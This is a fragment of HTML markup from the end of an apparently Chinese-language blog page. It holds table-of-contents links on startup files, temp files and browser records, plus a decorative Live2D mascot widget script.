href="#开机启动文件"><span class="toc-number">9.1.1.</span> <span class="toc-text">开机启动文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#temp临时文件"><span class="toc-number">9.1.2.</span> <span class="toc-text">temp临时文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#浏览器信息记录"><span class="toc-number">9.1.3.</span> <span class="toc-text">浏览器信息记录</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
